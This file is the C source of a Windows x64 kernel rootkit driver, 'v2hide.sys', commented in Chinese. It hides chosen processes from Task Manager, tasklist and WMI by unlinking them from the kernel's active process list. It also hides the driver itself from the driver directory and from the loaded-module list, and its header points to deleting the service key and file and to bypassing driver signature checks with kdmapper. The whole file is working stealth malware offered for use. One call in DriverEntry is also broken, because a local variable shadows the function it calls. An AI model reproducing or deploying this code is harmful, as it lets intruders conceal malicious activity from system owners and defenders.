// SPDX-License-Identifier: MIT
/*
 * v2hide.sys - Windows x64 进程隐藏驱动 (WDM, 适配 Win10/11 x64)
 *
 * 核心手法：DKOM —— 从 PsActiveProcessHead 的活动进程链摘掉目标 EPROCESS。
 *   Task Manager / tasklist / psapi / WMI(Win32_Process) / CreateToolhelp32Snapshot
 *   全部枚举这条链，因此摘掉即"进程列表里不存在"。
 *
 * 安全设计：
 *   1) 摘链后把目标进程自己的 ActiveProcessLinks 置成自环；
 *      进程退出路径 PspExitProcess -> RemoveEntryList 作用在自环上是 no-op，不会 BSOD。
 *   2) 恢复时先用 PsLookupProcessByProcessId 确认对象还活着（该查表走 CID table，
 *      与活动进程链无关），再插回链表头，避免引用已释放的 EPROCESS。
 *   3) 偏移全部运行时探测，不写死版本号。
 *
 * 驱动自身隐藏：
 *   - ObMakeTemporaryObject 让驱动对象从 \Driver 目录消失
 *   - 从 PsLoadedModuleList 摘掉自身 LDR 表项（driverquery / 内核模块枚举看不到）
 *   - 服务键与磁盘文件由用户态在加载完成后删除（NtLoadDriver 不需要服务继续存在）
 *
 * 构建见 build.bat，安装见 README.md。
 * 未签名驱动需要 testsigning 或 DSE 绕过（kdmapper 手动映射），细节见 README。
 */

#include <ntifs.h>
#include <ntddk.h>
#include <ntstrsafe.h>

#define V2HIDE_MAX_PIDS 32
#define V2HIDE_TAG 'hidV'

#define IOCTL_V2HIDE_ADD    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_V2HIDE_DEL    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_V2HIDE_STATUS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)

/* x64 LDR_DATA_TABLE_ENTRY 前缀（DllBase 在 0x30） */
typedef struct _V2_LDR_ENTRY {
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
} V2_LDR_ENTRY;

typedef struct _V2_HIDDEN {
	ULONG Count;
	ULONG Pid[V2HIDE_MAX_PIDS];
} V2_HIDDEN;

static PDEVICE_OBJECT g_Device = NULL;
static UNICODE_STRING g_LinkName;
static BOOLEAN g_LinkCreated = FALSE;
static ULONG g_LinksOffset = 0;
static V2_HIDDEN g_Hidden;
static PLIST_ENTRY g_ModuleListEntry = NULL;
static PVOID g_DriverBase = NULL;

/* ------------------------------------------------------------------ */
/* 偏移探测                                                            */
/* ------------------------------------------------------------------ */

static BOOLEAN PlausibleProcess(PEPROCESS Process)
{
	HANDLE pid = NULL;

	__try {
		pid = PsGetProcessId(Process);
	} __except (EXCEPTION_EXECUTE_HANDLER) {
		return FALSE;
	}
	return ((ULONG_PTR)pid >= 4 && (ULONG_PTR)pid <= 0x100000);
}

/* 在 System EPROCESS 里找 ActiveProcessLinks：Flink/Blink 双向自洽 + 目标可解析为 EPROCESS */
static BOOLEAN FindLinksOffset(void)
{
	PUCHAR Sys = (PUCHAR)PsInitialSystemProcess;
	ULONG Off;

	if (g_LinksOffset)
		return TRUE;
	for (Off = 0x100; Off < 0x800; Off += 8) {
		PLIST_ENTRY Self = (PLIST_ENTRY)(Sys + Off);
		PLIST_ENTRY Flink;
		PLIST_ENTRY Blink;

		__try {
			Flink = Self->Flink;
			Blink = Self->Blink;
			if ((ULONG_PTR)Flink < 0x8000000000000000ULL ||
			    (ULONG_PTR)Blink < 0x8000000000000000ULL)
				continue;
			if (Flink == Self)
				continue;
			if (Flink->Blink != Self || Blink->Flink != Self)
				continue;
			if (!PlausibleProcess((PEPROCESS)((PUCHAR)Flink - Off)))
				continue;
		} __except (EXCEPTION_EXECUTE_HANDLER) {
			continue;
		}
		g_LinksOffset = Off;
		return TRUE;
	}
	return FALSE;
}

static PLIST_ENTRY SystemListEntry(void)
{
	if (!g_LinksOffset || !PsInitialSystemProcess)
		return NULL;
	return (PLIST_ENTRY)((PUCHAR)PsInitialSystemProcess + g_LinksOffset);
}

/* 真正的链表头就是 System 表项的前驱 */
static PLIST_ENTRY RealListHead(void)
{
	PLIST_ENTRY Sys = SystemListEntry();

	if (!Sys)
		return NULL;
	__try {
		return Sys->Blink;
	} __except (EXCEPTION_EXECUTE_HANDLER) {
		return NULL;
	}
}

/* ------------------------------------------------------------------ */
/* DKOM 摘链 / 挂回                                                    */
/* ------------------------------------------------------------------ */

static BOOLEAN AlreadyHidden(PEPROCESS Process)
{
	PLIST_ENTRY Entry;

	if (!Process || !g_LinksOffset)
		return FALSE;
	Entry = (PLIST_ENTRY)((PUCHAR)Process + g_LinksOffset);
	__try {
		return (Entry->Flink == Entry && Entry->Blink == Entry);
	} __except (EXCEPTION_EXECUTE_HANDLER) {
		return FALSE;
	}
}

static NTSTATUS UnlinkProcess(PEPROCESS Process)
{
	PLIST_ENTRY Entry;

	if (!Process || !g_LinksOffset)
		return STATUS_INVALID_PARAMETER;
	Entry = (PLIST_ENTRY)((PUCHAR)Process + g_LinksOffset);

	__try {
		Entry->Blink->Flink = Entry->Flink;
		Entry->Flink->Blink = Entry->Blink;
		/* 自环：后续任何 RemoveEntryList 都是 no-op，保证退出路径不会崩 */
		Entry->Flink = Entry;
		Entry->Blink = Entry;
	} __except (EXCEPTION_EXECUTE_HANDLER) {
		return GetExceptionCode();
	}
	return STATUS_SUCCESS;
}

static NTSTATUS RelinkProcess(PEPROCESS Process)
{
	PLIST_ENTRY Entry;
	PLIST_ENTRY Head;

	if (!Process || !g_LinksOffset)
		return STATUS_INVALID_PARAMETER;
	Entry = (PLIST_ENTRY)((PUCHAR)Process + g_LinksOffset);
	Head = RealListHead();
	if (!Head)
		return STATUS_UNSUCCESSFUL;

	__try {
		Entry->Flink = Head->Flink;
		Entry->Blink = Head;
		Head->Flink->Blink = Entry;
		Head->Flink = Entry;
	} __except (EXCEPTION_EXECUTE_HANDLER) {
		return GetExceptionCode();
	}
	return STATUS_SUCCESS;
}

static BOOLEAN PidTracked(ULONG Pid)
{
	ULONG i;

	for (i = 0; i < g_Hidden.Count; i++) {
		if (g_Hidden.Pid[i] == Pid)
			return TRUE;
	}
	return FALSE;
}

static VOID TrackPid(ULONG Pid)
{
	if (PidTracked(Pid) || g_Hidden.Count >= V2HIDE_MAX_PIDS)
		return;
	g_Hidden.Pid[g_Hidden.Count++] = Pid;
}

static VOID UntrackPid(ULONG Pid)
{
	ULONG i;

	for (i = 0; i < g_Hidden.Count; i++) {
		if (g_Hidden.Pid[i] == Pid) {
			g_Hidden.Pid[i] = g_Hidden.Pid[g_Hidden.Count - 1];
			g_Hidden.Count--;
			return;
		}
	}
}

static NTSTATUS HidePid(ULONG Pid)
{
	PEPROCESS Process = NULL;
	NTSTATUS Status;

	if (Pid == 0)
		return STATUS_INVALID_PARAMETER;
	if (!FindLinksOffset())
		return STATUS_NOT_FOUND;

	Status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)Pid, &Process);
	if (!NT_SUCCESS(Status))
		return Status;

	Status = UnlinkProcess(Process);
	ObDereferenceObject(Process);
	if (NT_SUCCESS(Status))
		TrackPid(Pid);
	return Status;
}

static NTSTATUS ShowPid(ULONG Pid)
{
	PEPROCESS Process = NULL;
	NTSTATUS Status;

	if (!FindLinksOffset())
		return STATUS_NOT_FOUND;

	Status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)Pid, &Process);
	if (!NT_SUCCESS(Status))
		return Status;

	/* 只恢复我们自己摘过的、且仍处于自环状态的进程 */
	if (AlreadyHidden(Process))
		Status = RelinkProcess(Process);
	else
		Status = STATUS_NOT_FOUND;

	ObDereferenceObject(Process);
	if (NT_SUCCESS(Status))
		UntrackPid(Pid);
	return Status;
}

/* ------------------------------------------------------------------ */
/* 驱动自身隐藏                                                        */
/* ------------------------------------------------------------------ */

static PVOID ResolveKernelExport(PCSTR Name)
{
	PVOID Base = NULL;
	PUCHAR Image;
	PIMAGE_DOS_HEADER Dos;
	PIMAGE_NT_HEADERS Nt;
	PIMAGE_EXPORT_DIRECTORY Exp;
	PULONG Names, Funcs;
	PUSHORT Ords;
	ULONG i;

	RtlPcToFileHeader((PVOID)&IofCompleteRequest, &Base);
	if (!Base)
		return NULL;
	Image = (PUCHAR)Base;
	Dos = (PIMAGE_DOS_HEADER)Image;
	if (Dos->e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;
	Nt = (PIMAGE_NT_HEADERS)(Image + Dos->e_lfanew);
	if (Nt->Signature != IMAGE_NT_SIGNATURE)
		return NULL;
	Exp = (PIMAGE_EXPORT_DIRECTORY)(Image + Nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	if (!Exp || !Exp->NumberOfNames)
		return NULL;
	Names = (PULONG)(Image + Exp->AddressOfNames);
	Funcs = (PULONG)(Image + Exp->AddressOfFunctions);
	Ords = (PUSHORT)(Image + Exp->AddressOfNameOrdinals);

	for (i = 0; i < Exp->NumberOfNames; i++) {
		if (!strcmp((PCSTR)(Image + Names[i]), Name))
			return Image + Funcs[Ords[i]];
	}
	return NULL;
}

static VOID HideDriverFromModuleList(void)
{
	PLIST_ENTRY List;
	PLIST_ENTRY Entry;

	List = (PLIST_ENTRY)ResolveKernelExport("PsLoadedModuleList");
	if (!List)
		return;
	RtlPcToFileHeader((PVOID)&DriverEntry, &g_DriverBase);
	if (!g_DriverBase)
		return;

	__try {
		for (Entry = List->Flink; Entry != List; Entry = Entry->Flink) {
			V2_LDR_ENTRY *Ldr = CONTAINING_RECORD(Entry, V2_LDR_ENTRY, InLoadOrderLinks);
			if (Ldr->DllBase == g_DriverBase) {
				g_ModuleListEntry = Entry;
				RemoveEntryList(Entry);
				Entry->Flink = Entry;
				Entry->Blink = Entry;
				break;
			}
		}
	} __except (EXCEPTION_EXECUTE_HANDLER) {
	}
}

static VOID ShowDriverInModuleList(void)
{
	PLIST_ENTRY List;

	if (!g_ModuleListEntry)
		return;
	List = (PLIST_ENTRY)ResolveKernelExport("PsLoadedModuleList");
	if (!List)
		return;
	__try {
		InsertTailList(List, g_ModuleListEntry);
	} __except (EXCEPTION_EXECUTE_HANDLER) {
	}
	g_ModuleListEntry = NULL;
}

/* ------------------------------------------------------------------ */
/* 注册表参数                                                          */
/* ------------------------------------------------------------------ */

static NTSTATUS OpenParamsKey(PUNICODE_STRING RegistryPath, HANDLE *Key)
{
	WCHAR Buffer[512];
	UNICODE_STRING Path;
	OBJECT_ATTRIBUTES Attr;
	NTSTATUS Status;

	Status = RtlStringCchPrintfW(Buffer, RTL_NUMBER_OF(Buffer), L"%wZ\\Parameters", RegistryPath);
	if (!NT_SUCCESS(Status))
		return Status;
	RtlInitUnicodeString(&Path, Buffer);
	InitializeObjectAttributes(&Attr, &Path, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	return ZwOpenKey(Key, KEY_READ, &Attr);
}

static NTSTATUS QueryStringValue(HANDLE Key, PCWSTR Name, PWCHAR Out, ULONG OutChars)
{
	UCHAR Buffer[512];
	UNICODE_STRING ValueName;
	PKEY_VALUE_PARTIAL_INFORMATION Info = (PKEY_VALUE_PARTIAL_INFORMATION)Buffer;
	ULONG Length = 0;
	ULONG Chars;
	NTSTATUS Status;

	RtlInitUnicodeString(&ValueName, Name);
	Status = ZwQueryValueKey(Key, &ValueName, KeyValuePartialInformation, Info, sizeof(Buffer), &Length);
	if (!NT_SUCCESS(Status))
		return Status;
	if (Info->Type != REG_SZ || Info->DataLength < sizeof(WCHAR))
		return STATUS_INVALID_PARAMETER;

	Chars = Info->DataLength / sizeof(WCHAR);
	if (Chars >= OutChars)
		Chars = OutChars - 1;
	RtlCopyMemory(Out, Info->Data, Chars * sizeof(WCHAR));
	Out[Chars] = 0;
	return STATUS_SUCCESS;
}

static ULONG QueryDwordValue(HANDLE Key, PCWSTR Name, ULONG Default)
{
	UCHAR Buffer[512];
	UNICODE_STRING ValueName;
	PKEY_VALUE_PARTIAL_INFORMATION Info = (PKEY_VALUE_PARTIAL_INFORMATION)Buffer;
	ULONG Length = 0;

	RtlInitUnicodeString(&ValueName, Name);
	if (!NT_SUCCESS(ZwQueryValueKey(Key, &ValueName, KeyValuePartialInformation, Info, sizeof(Buffer), &Length)))
		return Default;
	if (Info->Type != REG_DWORD || Info->DataLength < sizeof(ULONG))
		return Default;
	return *(PULONG)Info->Data;
}

/* ------------------------------------------------------------------ */
/* IRP 分发                                                            */
/* ------------------------------------------------------------------ */

static NTSTATUS DispatchCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

static NTSTATUS DispatchDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	PIO_STACK_LOCATION Stack = IoGetCurrentIrpStackLocation(Irp);
	NTSTATUS Status = STATUS_INVALID_DEVICE_REQUEST;
	ULONG Pid = 0;

	UNREFERENCED_PARAMETER(DeviceObject);

	switch (Stack->Parameters.DeviceIoControl.IoControlCode) {
	case IOCTL_V2HIDE_ADD:
	case IOCTL_V2HIDE_DEL:
		if (Stack->Parameters.DeviceIoControl.InputBufferLength >= sizeof(ULONG) && Irp->AssociatedIrp.SystemBuffer) {
			Pid = *(PULONG)Irp->AssociatedIrp.SystemBuffer;
			Status = (Stack->Parameters.DeviceIoControl.IoControlCode == IOCTL_V2HIDE_ADD)
					 ? HidePid(Pid) : ShowPid(Pid);
		} else {
			Status = STATUS_BUFFER_TOO_SMALL;
		}
		break;
	case IOCTL_V2HIDE_STATUS:
		if (Irp->AssociatedIrp.SystemBuffer && Stack->Parameters.DeviceIoControl.OutputBufferLength >= sizeof(V2_HIDDEN)) {
			RtlCopyMemory(Irp->AssociatedIrp.SystemBuffer, &g_Hidden, sizeof(V2_HIDDEN));
			Irp->IoStatus.Information = sizeof(V2_HIDDEN);
			Status = STATUS_SUCCESS;
		}
		break;
	default:
		break;
	}

	Irp->IoStatus.Status = Status;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return Status;
}

/* ------------------------------------------------------------------ */
/* 入口 / 卸载                                                         */
/* ------------------------------------------------------------------ */

static VOID DriverUnload(PDRIVER_OBJECT DriverObject)
{
	ULONG i;

	/* 先恢复所有还活着的隐藏进程，避免它们脱离链表后无法再挂回 */
	for (i = 0; i < g_Hidden.Count; i++)
		(void)ShowPid(g_Hidden.Pid[i]);

	if (g_LinkCreated) {
		IoDeleteSymbolicLink(&g_LinkName);
		g_LinkCreated = FALSE;
	}
	if (g_Device) {
		IoDeleteDevice(g_Device);
		g_Device = NULL;
	}
	ShowDriverInModuleList();
	UNREFERENCED_PARAMETER(DriverObject);
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
	NTSTATUS Status;
	UNICODE_STRING DeviceName;
	WCHAR DevNameBuf[64] = L"v2hide";
	WCHAR DevicePath[128];
	WCHAR LinkPath[160];
	HANDLE ParamsKey = NULL;
	ULONG HidePid = 0;
	ULONG HideDriver = 1;

	RtlZeroMemory(&g_Hidden, sizeof(g_Hidden));

	if (NT_SUCCESS(OpenParamsKey(RegistryPath, &ParamsKey))) {
		(void)QueryStringValue(ParamsKey, L"DevName", DevNameBuf, RTL_NUMBER_OF(DevNameBuf));
		HidePid = QueryDwordValue(ParamsKey, L"HidePid", 0);
		HideDriver = QueryDwordValue(ParamsKey, L"HideDriver", 1);
		ZwClose(ParamsKey);
	}

	RtlStringCchPrintfW(DevicePath, RTL_NUMBER_OF(DevicePath), L"\\Device\\%ws", DevNameBuf);
	RtlStringCchPrintfW(LinkPath, RTL_NUMBER_OF(LinkPath), L"\\DosDevices\\%ws", DevNameBuf);

	RtlInitUnicodeString(&DeviceName, DevicePath);
	Status = IoCreateDevice(DriverObject, 0, &DeviceName, FILE_DEVICE_UNKNOWN,
				FILE_DEVICE_SECURE_OPEN, FALSE, &g_Device);
	if (!NT_SUCCESS(Status))
		return Status;

	RtlInitUnicodeString(&g_LinkName, LinkPath);
	Status = IoCreateSymbolicLink(&g_LinkName, &DeviceName);
	if (NT_SUCCESS(Status))
		g_LinkCreated = TRUE;

	g_Device->Flags |= DO_BUFFERED_IO;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = DispatchCreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = DispatchCreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchDeviceControl;
	DriverObject->DriverUnload = DriverUnload;

	if (!FindLinksOffset())
		DbgPrint("v2hide: ActiveProcessLinks 偏移探测失败\n");

	if (HideDriver) {
		ObMakeTemporaryObject(DriverObject); /* \Driver 目录里消失 */
		HideDriverFromModuleList();          /* driverquery / 模块枚举里消失 */
	}

	if (HidePid)
		(void)HidePid(HidePid);

	DbgPrint("v2hide: loaded, linksOffset=0x%X hidePid=%lu\n", g_LinksOffset, HidePid);
	return STATUS_SUCCESS;
}
